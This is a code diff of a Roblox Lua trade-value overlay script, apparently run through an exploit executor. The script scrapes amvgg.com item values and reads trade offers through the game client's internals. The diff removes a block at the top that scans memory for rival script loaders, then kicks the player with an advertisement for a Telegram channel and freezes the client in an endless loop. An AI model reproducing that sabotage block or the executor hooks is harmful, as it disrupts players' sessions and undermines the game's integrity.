@@ -1,43 +1,3 @@
--- discord.gg/syncrypt
-
-task.spawn(function()
-	local now = os.clock()
-	local exitTo
-
-	repeat
-		if not (os.clock() - now < 10) then
-			return
-		end
-
-		task.wait(0.5)
-		exitTo = nil
-
-		for _, v in filtergc("table", {
-			Keys = { "Config" }
-		}), nil, nil do
-			local value = rawget(v, "Config")
-
-			if type(value) == "table" then
-				if rawget(value, "run_url") then
-					exitTo = 1
-
-					break
-				elseif rawget(value, "loader") and rawget(value, "user_id") then
-					exitTo = 1
-
-					break
-				end
-			end
-		end
-	until exitTo == 1
-
-	game:GetService("Players").LocalPlayer:Kick("Получи правильный скрипт в тгк -> @ailajq")
-	wait(3)
-
-	while true do
-	end
-end)
-
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
@@ -61,14 +21,12 @@ local function v18(p1)
 	if p1 then
 		return (p1:gsub("%s+", " "):gsub("^%s+", ""):gsub("%s+$", ""))
 	end
-
 	return nil
 end
 local function v19(p2)
 	if p2 then
 		return (p2:gsub("%s*%b()", ""):gsub("^%s+", ""):gsub("%s+$", ""))
 	end
-
 	return nil
 end
 local function v20(p3)
@@ -77,16 +35,8 @@ end
 
 local t1 = {
 	MODE = "baseless",
-	MODE_ORDER = {
-		"baseless",
-		"ridepot",
-		"frost"
-	},
-	MODE_LABELS = {
-		baseless = "Baseless",
-		ridepot = "Ridepot",
-		frost = "Frost"
-	}
+	MODE_ORDER = { "baseless", "ridepot", "frost" },
+	MODE_LABELS = { baseless = "Baseless", ridepot = "Ridepot", frost = "Frost" }
 }
 local t2 = {}
 
@@ -107,65 +57,34 @@ local t6 = {}
 local t7 = {}
 local t8 = {}
 
-local function v33(p4)
-	return p4:lower():gsub("_", " ")
-end
+local function v33(p4) return p4:lower():gsub("_", " ") end
 local function v34(p5)
-	if p5 then
-		return p5:lower():gsub("[^%w]", "")
-	end
-
+	if p5 then return p5:lower():gsub("[^%w]", "") end
 	return nil
 end
 
 local t9 = {
-	{
-		patterns = {
-			"fly%-a",
-			"fly a"
-		},
-		amvgg = "Fly-A-Pet Potion",
-		value = 0.012
-	},
-	{
-		patterns = {
-			"ride%-a",
-			"ride a"
-		},
-		amvgg = "Ride-A-Pet Potion",
-		value = 0.0065
-	}
+	{ patterns = { "fly%-a", "fly a" }, amvgg = "Fly-A-Pet Potion", value = 0.012 },
+	{ patterns = { "ride%-a", "ride a" }, amvgg = "Ride-A-Pet Potion", value = 0.0065 }
 }
 
 local function v36(p6, p7)
 	for _, v in ipairs(p7) do
-		if p6:find(v, 1, false) then
-			return true
-		end
+		if p6:find(v, 1, false) then return true end
 	end
-
 	return false
 end
-local function v39(p8)
-	return t5[p8] or t6[p8:lower()]
-end
+local function v39(p8) return t5[p8] or t6[p8:lower()] end
 local function v40(p9, p10)
-	if not p9 then
-		return nil
-	end
-
+	if not p9 then return nil end
 	if p10 and InventoryDB[p10] and InventoryDB[p10][p9] then
 		return InventoryDB[p10][p9]
 	end
-
 	for _, v in pairs(InventoryDB) do
 		if type(v) == "table" then
-			if v[p9] then
-				return v[p9]
-			end
+			if v[p9] then return v[p9] end
 		end
 	end
-
 	return nil
 end
 local function v43(p11, p12, p13)
@@ -173,21 +92,15 @@ local function v43(p11, p12, p13)
 	local t11 = {}
 
 	local function v46(p14)
-		if p14 == nil then
-			return
-		end
-
+		if p14 == nil then return end
 		local v47 = v18(tostring(p14))
-
 		if v47 then
 			if not t11[v47] then
 				t11[v47] = true
 				table.insert(t10, v47)
 			end
 		end
-
 		local v48 = v20(v47)
-
 		if v48 and not t11[v48] then
 			t11[v48] = true
 			table.insert(t10, v48)
@@ -196,10 +109,8 @@ local function v43(p11, p12, p13)
 
 	if p13 then
 		v46(p13.kind)
-
 		if p13.id and KindDB[p13.id] then
 			local v49 = KindDB[p13.id]
-
 			v46(v49.name)
 			v46(v49.kind)
 			v46(v49.display_name)
@@ -209,193 +120,100 @@ local function v43(p11, p12, p13)
 	if p11 then
 		v46(p11)
 		v46(t2[p11])
-
 		local v50 = v40(p11, p12)
-
-		if v50 then
-			v46(v50.name)
-		end
+		if v50 then v46(v50.name) end
 	end
 
 	return t10
 end
 local function v51(p15)
-	if not p15 then
-		return nil
-	end
-
+	if not p15 then return nil end
 	local kind = p15.kind
-
 	if not kind and p15.id then
 		local v53 = KindDB[p15.id]
-
-		if v53 then
-			kind = v53.name or v53.kind
-		end
+		if v53 then kind = v53.name or v53.kind end
 	end
-
 	return kind
 end
 local function v54(p16)
-	if not p16 then
-		return nil
-	end
-
+	if not p16 then return nil end
 	local v55 = t2[p16]
-
 	if v55 then
 		local v56 = t3[v55] or t4[v55:lower()]
-
-		if v56 then
-			return v56
-		end
+		if v56 then return v56 end
 	end
-
 	local v57 = v18(p16)
-
 	if v57 then
 		local v58 = t3[v57] or t4[v57:lower()]
-
-		if v58 then
-			return v58
-		end
+		if v58 then return v58 end
 	end
-
 	return t4[v33(p16)]
 end
 local function v59(p17)
-	if not p17 then
-		return nil
-	end
-
-	for _, v in ipairs({
-		v18(p17),
-		v20(p17)
-	}) do
-		if not v then
-			continue
-		end
-
+	if not p17 then return nil end
+	for _, v in ipairs({ v18(p17), v20(p17) }) do
+		if not v then continue end
 		local v62 = t5[v] or t6[v:lower()]
-
-		if v62 then
-			return v62
-		end
-
+		if v62 then return v62 end
 		local v63 = v34(v)
-
-		if not v63 then
-			continue
-		end
-
-		if t8[v63] then
-			return t8[v63]
-		end
+		if not v63 then continue end
+		if t8[v63] then return t8[v63] end
 	end
 
 	local v64 = v20(p17)
-
 	if v64 then
 		local v65 = v64:lower()
 		local v66
 		local n1 = 0
-
 		for k, v in pairs(t6) do
 			if v65:sub(1, #k) == k and n1 < #k then
 				v66 = v
 				n1 = #k
 			end
 		end
-
-		if v66 then
-			return v66
-		end
+		if v66 then return v66 end
 	end
-
 	return nil
 end
 local function v70(p18)
-	if not p18 then
-		return nil
-	end
-
+	if not p18 then return nil end
 	local v71 = p18:lower()
-
 	for _, v in ipairs(t9) do
-		if not v36(v71, v.patterns) then
-			continue
-		end
-
+		if not v36(v71, v.patterns) then continue end
 		local v74 = v39(v.amvgg)
-
-		if v74 then
-			return v74
-		end
-
+		if v74 then return v74 end
 		if v.value then
-			return {
-				name = v.amvgg,
-				value = tostring(v.value)
-			}
+			return { name = v.amvgg, value = tostring(v.value) }
 		end
 	end
-
 	return v59(p18)
 end
 local function v75(p19, p20, p21)
 	local kind = p21 and p21.kind or p19
-
-	if kind and t7[kind] then
-		return t7[kind]
-	end
-
-	if p19 and t7[p19] then
-		return t7[p19]
-	end
-
+	if kind and t7[kind] then return t7[kind] end
+	if p19 and t7[p19] then return t7[p19] end
 	for _, v in ipairs(v43(p19, p20, p21)) do
 		local v79 = v70(v)
-
-		if v79 then
-			return v79
-		end
+		if v79 then return v79 end
 	end
-
-	if not p19 then
-		return nil
-	end
-
+	if not p19 then return nil end
 	local v80 = v70(p19)
-
-	if v80 then
-		return v80
-	end
-
+	if v80 then return v80 end
 	return t6[v33(p19)]
 end
 local function v81()
 	local food = InventoryDB.food or {}
-
 	for k, v in pairs(food) do
 		if type(v) == "table" then
 			if v.name then
 				local v85 = v.name:lower()
-
 				for _, v2 in ipairs(t9) do
 					if v36(v85, v2.patterns) then
 						local v88 = v39(v2.amvgg)
-
 						if not v88 and v2.value then
-							v88 = {
-								name = v2.amvgg,
-								value = tostring(v2.value)
-							}
+							v88 = { name = v2.amvgg, value = tostring(v2.value) }
 						end
-
-						if v88 then
-							t7[k] = v88
-						end
-
+						if v88 then t7[k] = v88 end
 						break
 					end
 				end
@@ -404,89 +222,50 @@ local function v81()
 	end
 end
 local function v89()
-	for k in pairs(t7) do
-		t7[k] = nil
-	end
-
+	for k in pairs(t7) do t7[k] = nil end
 	for k, v in pairs(InventoryDB) do
 		if k ~= "pets" and type(v) == "table" then
 			for k2, v2 in pairs(v) do
 				if type(v2) == "table" and v2.name then
 					local v95 = v70(v2.name)
-
-					if v95 then
-						t7[k2] = v95
-					end
+					if v95 then t7[k2] = v95 end
 				end
 			end
 		end
 	end
-
 	v81()
 end
 local function v96(p22)
 	local v97 = v18(p22.name)
-
-	if not v97 then
-		return
-	end
-
+	if not v97 then return end
 	t5[v97] = p22
 	t6[v97:lower()] = p22
-
 	local v98 = v34(v97)
-
-	if v98 then
-		t8[v98] = p22
-	end
+	if v98 then t8[v98] = p22 end
 end
 local function v99(p23, p24)
 	local v100 = 10 ^ p24
-
 	return math.floor(p23 * v100 + 0.5) / v100
 end
 
 local data = HttpService:JSONDecode("{\"0\":{\"NP\":0.08,\"R\":0.5,\"F\":0.6,\"NNP\":0.21,\"NR\":0.6,\"NF\":0.75,\"MNP\":0.45,\"MR\":0.65,\"MF\":0.775},\"1\":{\"NP\":0.08,\"R\":0.5,\"F\":0.6,\"NNP\":0.35,\"NR\":0.725,\"NF\":0.79,\"MNP\":0.55,\"MR\":0.675,\"MF\":0.8},\"2\":{\"NP\":0.1,\"R\":0.525,\"F\":0.625,\"NNP\":0.425,\"NR\":0.75,\"NF\":0.8,\"MNP\":0.65,\"MR\":0.75,\"MF\":0.81},\"3\":{\"NP\":0.125,\"R\":0.6,\"F\":0.65,\"NNP\":0.55,\"NR\":0.8,\"NF\":0.81,\"MNP\":0.725,\"MR\":0.8,\"MF\":0.85},\"4\":{\"NP\":0.166,\"R\":0.65,\"F\":0.7,\"NNP\":0.625,\"NR\":0.81,\"NF\":0.82,\"MNP\":0.75,\"MR\":0.825,\"MF\":0.86},\"5\":{\"NP\":0.2,\"R\":0.675,\"F\":0.725,\"NNP\":0.675,\"NR\":0.82,\"NF\":0.83,\"MNP\":0.775,\"MR\":0.85,\"MF\":0.89},\"6\":{\"NP\":0.3,\"R\":0.7,\"F\":0.75,\"NNP\":0.725,\"NR\":0.85,\"NF\":0.87,\"MNP\":0.825,\"MR\":0.9,\"MF\":0.925},\"7\":{\"NP\":0.45,\"R\":0.725,\"F\":0.775,\"NNP\":0.75,\"NR\":0.9,\"NF\":0.91,\"MNP\":0.85,\"MR\":0.92,\"MF\":0.95},\"8\":{\"NP\":0.55,\"R\":0.75,\"F\":0.8,\"NNP\":0.77,\"NR\":0.9,\"NF\":0.915,\"MNP\":0.875,\"MR\":0.93,\"MF\":0.96},\"9\":{\"NP\":0.65,\"R\":0.825,\"F\":0.85,\"NNP\":0.85,\"NR\":0.925,\"NF\":0.94,\"MNP\":0.925,\"MR\":0.95,\"MF\":0.975},\"10\":{\"NP\":0.8,\"R\":0.9,\"F\":0.92,\"NNP\":0.925,\"NR\":0.96,\"NF\":0.97,\"MNP\":1.05,\"MR\":0.98,\"MF\":0.99},\"11\":{\"NP\":0.9,\"R\":0.95,\"F\":0.975,\"NNP\":1,\"NR\":0.98,\"NF\":0.985,\"MNP\":1.05,\"MR\":1,\"MF\":1},\"12\":{\"NP\":0.9,\"R\":0.95,\"F\":0.975,\"NNP\":1.03,\"NR\":0.98,\"NF\":0.985,\"MNP\":1.1,\"MR\":1,\"MF\":1},\"21\":{\"NP\":0.75,\"R\":0.86,\"F\":0.875,\"NNP\":0.88,\"NR\":0.93,\"NF\":0.95,\"MNP\":1,\"MR\":0.98,\"MF\":0.99},\"22\":{\"NP\":0.75,\"R\":0.86,\"F\":0.875,\"NNP\":0.88,\"NR\":0.93,\"NF\":0.95,\"MNP\":0.97,\"MR\":0.98,\"MF\":0.99},\"23\":{\"NP\":0.7,\"R\":0.8,\"F\":0.85,\"NNP\":0.85,\"NR\":0.9,\"NF\":0.93,\"MNP\":0.95,\"MR\":0.965,\"MF\":0.985},\"33\":{\"NP\":0.15,\"R\":0.6,\"F\":0.65,\"NNP\":0.375,\"NR\":0.75,\"NF\":0.8,\"MNP\":0.5,\"MR\":0.7,\"MF\":0.8},\"44\":{\"NP\":0.97,\"R\":0.98,\"F\":0.985,\"NNP\":1,\"NR\":1,\"NF\":1,\"MNP\":1.025,\"MR\":1,\"MF\":1},\"45\":{\"NP\":0.97,\"R\":0.98,\"F\":0.985,\"NNP\":1,\"NR\":1,\"NF\":1,\"MNP\":1,\"MR\":1,\"MF\":1},\"46\":{\"NP\":0.98,\"R\":0.985,\"F\":0.99,\"NNP\":1,\"NR\":1,\"NF\":1,\"MNP\":1,\"MR\":1,\"MF\":1},\"47\":{\"NP\":0.98,\"R\":0.985,\"F\":0.99,\"NNP\":1,\"NR\":1,\"NF\":1,\"MNP\":1.05,\"MR\":1,\"MF\":1},\"48\":{\"NP\":0.985,\"R\":0.99,\"F\":0.995,\"NNP\":1,\"NR\":1,\"NF\":1,\"MNP\":1,\"MR\":1,\"MF\":1},\"49\":{\"NP\":0.985,\"R\":0.99,\"F\":0.995,\"NNP\":1,\"NR\":1,\"NF\":1,\"MNP\":1.05,\"MR\":1,\"MF\":1},\"50\":{\"NP\":0.985,\"R\":0.99,\"F\":0.995,\"NNP\":1,\"NR\":1,\"NF\":1,\"MNP\":1.025,\"MR\":1,\"MF\":1},\"55\":{\"NP\":0.9,\"R\":0.95,\"F\":0.975,\"NNP\":1,\"NR\":0.98,\"NF\":0.985,\"MNP\":1.075,\"MR\":1,\"MF\":1},\"66\":{\"NP\":0.9,\"R\":0.95,\"F\":0.975,\"NNP\":1,\"NR\":0.98,\"NF\":0.985,\"MNP\":1.125,\"MR\":1,\"MF\":1},\"69\":{\"NP\":0.9,\"R\":0.95,\"F\":0.975,\"NNP\":0.96,\"NR\":0.98,\"NF\":0.985,\"MNP\":1,\"MR\":1,\"MF\":1},\"79\":{\"NP\":0.97,\"R\":0.98,\"F\":0.985,\"NNP\":1,\"NR\":1,\"NF\":1,\"MNP\":1.05,\"MR\":1,\"MF\":1},\"81\":{\"NP\":0.98,\"R\":0.985,\"F\":0.99,\"NNP\":1,\"NR\":1,\"NF\":1,\"MNP\":1.025,\"MR\":1,\"MF\":1},\"99\":{\"NP\":0.8,\"R\":0.9,\"F\":0.92,\"NNP\":0.95,\"NR\":0.975,\"NF\":0.98,\"MNP\":1,\"MR\":1,\"MF\":1},\"111\":{\"NP\":0.04,\"R\":0.5,\"F\":0.6,\"NNP\":0.125,\"NR\":0.6,\"NF\":0.75,\"MNP\":0.33,\"MR\":0.65,\"MF\":0.75},\"222\":{\"NP\":0.02,\"R\":0.45,\"F\":0.55,\"NNP\":0.07,\"NR\":0.5,\"NF\":0.65,\"MNP\":0.275,\"MR\":0.55,\"MF\":0.65},\"333\":{\"NP\":0.03,\"R\":0.5,\"F\":0.6,\"NNP\":0.1,\"NR\":0.55,\"NF\":0.7,\"MNP\":0.3,\"MR\":0.6,\"MF\":0.7}}")
 local t12 = {
-	fr = "regularValue",
-	r = "rValue",
-	f = "fValue",
-	[""] = "npRegularValue",
-	nfr = "neonValue",
-	nr = "nrValue",
-	nf = "nfValue",
-	n = "npNeonValue",
-	mfr = "megaValue",
-	mr = "mrValue",
-	mf = "mfValue",
-	m = "npMegaValue"
+	fr = "regularValue", r = "rValue", f = "fValue", [""] = "npRegularValue",
+	nfr = "neonValue", nr = "nrValue", nf = "nfValue", n = "npNeonValue",
+	mfr = "megaValue", mr = "mrValue", mf = "mfValue", m = "npMegaValue"
 }
 local t13 = {
-	fr = "regular",
-	r = "R",
-	f = "F",
-	[""] = "NP",
-	nfr = "neon",
-	nr = "NR",
-	nf = "NF",
-	n = "NNP",
-	mfr = "mega",
-	mr = "MR",
-	mf = "MF",
-	m = "MNP"
+	fr = "regular", r = "R", f = "F", [""] = "NP",
+	nfr = "neon", nr = "NR", nf = "NF", n = "NNP",
+	mfr = "mega", mr = "MR", mf = "MF", m = "MNP"
 }
 
 local function v104(p25)
 	local v105 = tonumber(p25.category)
-
 	if v105 then
 		if v105 ~= 13 then
 			local v106 = data[tostring(v105)]
-
-			if not v106 then
-				return nil
-			end
-
+			if not v106 then return nil end
 			local v107 = tonumber(p25.regularValue) or 0
 			local v108 = tonumber(p25.neonValue) or 0
 			local v109 = tonumber(p25.megaValue) or 0
@@ -514,135 +293,73 @@ local function v104(p25)
 				NR = v108 > 0.2 and v108 or v99(v108 * v106.NR, 4),
 				NF = v108 > 0.2 and v108 or v99(v108 * v106.NF, 4)
 			}
-
 			t14.MNP = v99(v109 * v106.MNP, 4)
 			t14.MR = v109 > 0.9 and v109 or v99(v109 * v106.MR, 4)
 			t14.MF = v109 > 0.9 and v109 or v99(v109 * v106.MF, 4)
-
 			return t14
 		end
 	end
-
 	return nil
 end
 local function v112(p26)
 	local v113 = (p26.flyable == true and "f" or "") .. (p26.rideable == true and "r" or "")
-
-	if p26.mega_neon == true then
-		return "m" .. v113
-	end
-
-	if p26.neon == true then
-		return "n" .. v113
-	end
-
+	if p26.mega_neon == true then return "m" .. v113 end
+	if p26.neon == true then return "n" .. v113 end
 	return v113
 end
 local function v114(p27, p28)
 	if tonumber(p27.category) == 13 then
 		local v115 = t12[p28]
-
-		if v115 then
-			return tonumber(p27[v115])
-		end
-
+		if v115 then return tonumber(p27[v115]) end
 		return nil
 	end
 
 	local v116 = v104(p27)
-
 	if not v116 then
 		if p28 == "r" or p28 == "nr" then
 			local v117 = p28:gsub("r", "f")
-
-			if v117 == "f" then
-				return tonumber(p27.regularValue) or 0
-			end
-
-			if v117 == "nf" then
-				return tonumber(p27.neonValue) or 0
-			end
+			if v117 == "f" then return tonumber(p27.regularValue) or 0 end
+			if v117 == "nf" then return tonumber(p27.neonValue) or 0 end
 		end
-
-		if p28 ~= "fr" and p28 ~= "nfr" and p28 ~= "mfr" then
-			return nil
-		end
-
-		if p28 == "nfr" then
-			return tonumber(p27.neonValue)
-		end
-
-		if p28 == "mfr" then
-			return tonumber(p27.megaValue)
-		end
-
+		if p28 ~= "fr" and p28 ~= "nfr" and p28 ~= "mfr" then return nil end
+		if p28 == "nfr" then return tonumber(p27.neonValue) end
+		if p28 == "mfr" then return tonumber(p27.megaValue) end
 		return tonumber(p27.regularValue)
 	end
 
 	local v118 = t13[p28]
-
-	if v118 == "regular" then
-		return tonumber(p27.regularValue)
-	end
-
-	if v118 == "neon" then
-		return tonumber(p27.neonValue)
-	end
-
-	if v118 == "mega" then
-		return tonumber(p27.megaValue)
-	end
+	if v118 == "regular" then return tonumber(p27.regularValue) end
+	if v118 == "neon" then return tonumber(p27.neonValue) end
+	if v118 == "mega" then return tonumber(p27.megaValue) end
 
 	local v119 = v116[v118]
-
 	if (v119 == 0 or v119 == nil) and (p28 == "r" or p28 == "nr") then
 		local v120 = t13[p28:gsub("r", "f")]
-
 		if v120 then
 			local v121 = v116[v120]
-
-			if v121 and v121 > 0 then
-				return v121
-			end
+			if v121 and v121 > 0 then return v121 end
 		end
 	end
-
 	return v119 or 0
 end
 local function v122(p29)
 	local v123 = math.abs(p29)
 	local n2
-
-	if v123 >= 100 then
-		n2 = 0
-	elseif v123 >= 10 then
-		n2 = 1
-	elseif v123 >= 1 then
-		n2 = 2
-	elseif v123 >= 0.1 then
-		n2 = 3
-	else
-		n2 = 4
-	end
-
+	if v123 >= 100 then n2 = 0
+	elseif v123 >= 10 then n2 = 1
+	elseif v123 >= 1 then n2 = 2
+	elseif v123 >= 0.1 then n2 = 3
+	else n2 = 4 end
 	local v125 = 10 ^ n2
-
 	return math.floor(p29 * v125 + 0.5) / v125
 end
-local function v126(p30)
-	return v122(0.66666666666666663 * p30)
-end
-local function v127(p31)
-	return math.floor(math.floor(154 * p31 * 20 + 0.5) / 20 * 100 + 0.5) / 100
-end
+local function v126(p30) return v122(0.66666666666666663 * p30) end
+local function v127(p31) return math.floor(math.floor(154 * p31 * 20 + 0.5) / 20 * 100 + 0.5) / 100 end
 local function v128(p32, p33)
 	local v129 = p32:gsub("\\u0026", "&"):gsub("\\\"", "\"")
 	local v130 = "\"" .. p33 .. "\":"
 	local pos = v129:find(v130 .. "%[")
-
-	if not pos then
-		return nil
-	end
+	if not pos then return nil end
 
 	local v132 = pos + #v130
 	local n3 = 0
@@ -652,42 +369,20 @@ local function v128(p32, p33)
 
 	for i = v132, math.min(v132 + 4000000, #v129) do
 		local v138 = v129:sub(i, i)
-
 		if not v135 then
-			if v138 == "\"" then
-				v135 = true
-			elseif v138 == "[" then
-				n3 += 1
-			elseif v138 == "]" then
-				n3 -= 1
-			end
-		elseif v136 then
-			v136 = false
-		elseif v138 == "\\" then
-			v136 = true
-		elseif v138 == "\"" then
-			v135 = false
-		end
-
-		if n3 == 0 and v132 < i then
-			v134 = i
-
-			break
-		end
+			if v138 == "\"" then v135 = true
+			elseif v138 == "[" then n3 += 1
+			elseif v138 == "]" then n3 -= 1 end
+		elseif v136 then v136 = false
+		elseif v138 == "\\" then v136 = true
+		elseif v138 == "\"" then v135 = false end
+		if n3 == 0 and v132 < i then v134 = i break end
 	end
 
 	local v139 = v129:sub(v132, v134)
-
-	local function v140()
-		return HttpService:JSONDecode(v139)
-	end
-
+	local function v140() return HttpService:JSONDecode(v139) end
 	local ok, result = pcall(v140)
-
-	if ok and result then
-		return result
-	end
-
+	if ok and result then return result end
 	return nil
 end
 local function v143(p34, p35)
@@ -701,73 +396,30 @@ local function v143(p34, p35)
 			}
 		})
 	end)
-
-	if ok and result and result.Success then
-		return v128(result.Body, p35)
-	end
-
+	if ok and result and result.Success then return v128(result.Body, p35) end
 	return nil
 end
 
 local t15 = {
-	{
-		label = "pets",
-		url = "https://amvgg.com/values/pets",
-		key = "pets"
-	},
-	{
-		label = "eggs",
-		url = "https://amvgg.com/values/eggs",
-		key = "items"
-	},
-	{
-		label = "petwear",
-		url = "https://amvgg.com/values/petwear",
-		key = "items"
-	},
-	{
-		label = "strollers",
-		url = "https://amvgg.com/values/strollers",
-		key = "items"
-	},
-	{
-		label = "food",
-		url = "https://amvgg.com/values/food",
-		key = "items"
-	},
-	{
-		label = "vehicles",
-		url = "https://amvgg.com/values/vehicles",
-		key = "items"
-	},
-	{
-		label = "toys",
-		url = "https://amvgg.com/values/toys",
-		key = "items"
-	},
-	{
-		label = "gifts",
-		url = "https://amvgg.com/values/gifts",
-		key = "items"
-	},
-	{
-		label = "stickers",
-		url = "https://amvgg.com/values/stickers",
-		key = "items"
-	}
+	{ label = "pets", url = "https://amvgg.com/values/pets", key = "pets" },
+	{ label = "eggs", url = "https://amvgg.com/values/eggs", key = "items" },
+	{ label = "petwear", url = "https://amvgg.com/values/petwear", key = "items" },
+	{ label = "strollers", url = "https://amvgg.com/values/strollers", key = "items" },
+	{ label = "food", url = "https://amvgg.com/values/food", key = "items" },
+	{ label = "vehicles", url = "https://amvgg.com/values/vehicles", key = "items" },
+	{ label = "toys", url = "https://amvgg.com/values/toys", key = "items" },
+	{ label = "gifts", url = "https://amvgg.com/values/gifts", key = "items" },
+	{ label = "stickers", url = "https://amvgg.com/values/stickers", key = "items" }
 }
 
 task.spawn(function()
 	for _, v in ipairs(t15) do
 		local v149 = v143(v.url, v.key)
-
 		if v149 then
 			local n4 = 0
-
 			if v.key == "pets" then
 				for _, v2 in ipairs(v149) do
 					local v153 = v18(v2.name)
-
 					if v153 then
 						t3[v153] = v2
 						t4[v153:lower()] = v2
@@ -780,28 +432,18 @@ task.spawn(function()
 					n4 += 1
 				end
 			end
-
 			print("[amvgg] Loaded " .. n4 .. " " .. v.label)
 		else
 			warn("[amvgg] Failed to load " .. v.label)
 		end
-
 		task.wait(0)
 	end
-
 	v89()
-
 	local n5 = 0
-
-	for _ in pairs(t7) do
-		n5 += 1
-	end
-
+	for _ in pairs(t7) do n5 += 1 end
 	print("[amvgg] Mapped " .. n5 .. " inventory kinds to amvgg values")
 	task.defer(function()
-		if BackpackApp then
-			BackpackApp:refresh_rendered_items()
-		end
+		if BackpackApp then BackpackApp:refresh_rendered_items() end
 	end)
 end)
 v89()
@@ -809,93 +451,48 @@ v89()
 local function v158(p36, p37, p38, p39)
 	if p38 and p38 ~= "pets" then
 		local v159 = v75(p36, p38, p39)
-
-		if v159 then
-			return tonumber(v159.value) or 0
-		end
+		if v159 then return tonumber(v159.value) or 0 end
 	end
-
 	local v160 = v54(p36)
-
 	if not v160 then
 		local v161 = v75(p36, p38, p39)
-
-		if v161 then
-			return tonumber(v161.value) or 0
-		end
-
+		if v161 then return tonumber(v161.value) or 0 end
 		return 0
 	end
-
 	local v162 = v112(p37 or {})
 	local v163 = v114(v160, v162) or 0
-
 	if v163 == 0 and (v162 == "r" or v162 == "nr") then
 		local v164 = v162:gsub("r", "f")
 		local v165 = v114(v160, v164) or 0
-
-		if v165 > 0 then
-			return v165
-		end
+		if v165 > 0 then return v165 end
 	end
-
 	if v163 == 0 then
-		for _, v in ipairs({
-			"fr",
-			"f",
-			"r",
-			"nfr",
-			"nf",
-			"nr",
-			"mfr",
-			"mf",
-			"mr"
-		}) do
+		for _, v in ipairs({ "fr","f","r","nfr","nf","nr","mfr","mf","mr" }) do
 			local v168 = v114(v160, v) or 0
-
-			if v168 > 0 then
-				return v168
-			end
+			if v168 > 0 then return v168 end
 		end
 	end
-
 	return v163
 end
 local function val(p40, p41, p42, p43)
 	local v170 = v158(p40, p41, p42, p43)
-
-	if t1.MODE == "ridepot" then
-		return v127(v170)
-	end
-
-	if t1.MODE == "frost" then
-		return v126(v170)
-	end
-
+	if t1.MODE == "ridepot" then return v127(v170) end
+	if t1.MODE == "frost" then return v126(v170) end
 	return v170
 end
 local function v171(p44)
 	local ok, result = pcall(p44)
-
-	if ok and type(result) == "table" and type(result.items) == "table" then
-		return result
-	end
-
+	if ok and type(result) == "table" and type(result.items) == "table" then return result end
 	return nil
 end
 local function getItemsFromOffer(p45)
-	if not p45 or type(p45.items) ~= "table" then
-		return {}, 0
-	end
-
+	if not p45 or type(p45.items) ~= "table" then return {}, 0 end
 	local t16 = {}
 	local n6 = 0
-
 	for _, item in ipairs(p45.items) do
 		local category = item.category
 		local v180 = v51(item)
 		local v181 = val(v180, item.properties, category, item)
-
 		n6 += v181
 		table.insert(t16, {
 			name = v180 or item.kind or "?",
@@ -904,68 +501,39 @@ local function getItemsFromOffer(p45)
 			category = category
 		})
 	end
-
 	return t16, n6
 end
 local function getItemsFromMyOffer()
-	local v183 = v171(function()
-		return TradeApp:_get_my_offer()
-	end)
-
+	local v183 = v171(function() return TradeApp:_get_my_offer() end)
 	return getItemsFromOffer(v183)
 end
 local function getItemsFromPartnerOffer()
-	local v185 = v171(function()
-		return TradeApp:_get_partner_offer()
-	end)
-
+	local v185 = v171(function() return TradeApp:_get_partner_offer() end)
 	return getItemsFromOffer(v185)
 end
 local function formatValue(p46)
-	if p46 == 0 then
-		return "0"
-	end
-
-	if p46 >= 1000 then
-		return string.format("%.1fk", p46 / 1000)
-	end
-
-	if p46 >= 100 then
-		return string.format("%.0f", p46)
-	end
-
+	if p46 == 0 then return "0" end
+	if p46 >= 1000 then return string.format("%.1fk", p46 / 1000) end
+	if p46 >= 100 then return string.format("%.0f", p46) end
 	return (string.format("%.4f", p46):gsub("%.?0+$", ""))
 end
 local function getSingleVal(p47, p48, p49)
 	local v188 = val
 	local v189 = p47
-	local v190 = p48 or {
-		flyable = true,
-		rideable = true
-	}
-
+	local v190 = p48 or { flyable = true, rideable = true }
 	return v188(v189, v190, p49 or "pets")
 end
 
 t1.SetMode = function(p50)
 	local v191 = false
-
 	for _, v in ipairs(t1.MODE_ORDER) do
-		if v == p50 then
-			v191 = true
-
-			break
-		end
+		if v == p50 then v191 = true break end
 	end
-
 	if v191 then
 		t1.MODE = p50
-
 		return true
 	end
-
 	warn("[amvgg] Unknown VALUE_MODE: " .. tostring(p50))
-
 	return false
 end
 t1.GetItemsFromOffer = getItemsFromOffer
@@ -996,7 +564,6 @@ Frame.Visible = true
 Frame.Parent = ScreenGui
 
 local UICorner = Instance.new("UICorner")
-
 UICorner.CornerRadius = UDim.new(0, 14)
 UICorner.Parent = Frame
 
@@ -1010,22 +577,18 @@ Frame.InputBegan:Connect(function(input)
 		Position = input.Position
 		Position2 = Frame.Position
 		input.Changed:Connect(function()
-			if input.UserInputState == Enum.UserInputState.End then
-				u198 = false
-			end
+			if input.UserInputState == Enum.UserInputState.End then u198 = false end
 		end)
 	end
 end)
 UserInputService.InputChanged:Connect(function(input)
 	if u198 and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
 		local v201 = input.Position - Position
-
 		Frame.Position = UDim2.new(Position2.X.Scale, Position2.X.Offset + v201.X, Position2.Y.Scale, Position2.Y.Offset + v201.Y)
 	end
 end)
 
 local Frame2 = Instance.new("Frame")
-
 Frame2.Name = "ModeRow"
 Frame2.BackgroundTransparency = 1
 Frame2.Position = UDim2.new(0, 8, 0, 6)
@@ -1033,7 +596,6 @@ Frame2.Size = UDim2.new(1, -16, 0, 28)
 Frame2.Parent = Frame
 
 local UIListLayout = Instance.new("UIListLayout")
-
 UIListLayout.FillDirection = Enum.FillDirection.Horizontal
 UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Left
 UIListLayout.Padding = UDim.new(0, 4)
@@ -1041,9 +603,7 @@ UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
 UIListLayout.Parent = Frame2
 
 local t17 = {}
-
-local function v205()
-end
+local function v205() end
 local function v206()
 	for k, v in pairs(t17) do
 		if k == t1.MODE then
@@ -1059,7 +619,6 @@ end
 for i, v in ipairs(t1.MODE_ORDER) do
 	local v211 = t1.MODE_LABELS[v] or v
 	local TextButton = Instance.new("TextButton")
-
 	TextButton.Name = "ModeTab_" .. v
 	TextButton.LayoutOrder = i
 	TextButton.Size = UDim2.new(0, 148, 1, 0)
@@ -1071,7 +630,6 @@ for i, v in ipairs(t1.MODE_ORDER) do
 	TextButton.Parent = Frame2
 
 	local UICorner2 = Instance.new("UICorner")
-
 	UICorner2.CornerRadius = UDim.new(0, 8)
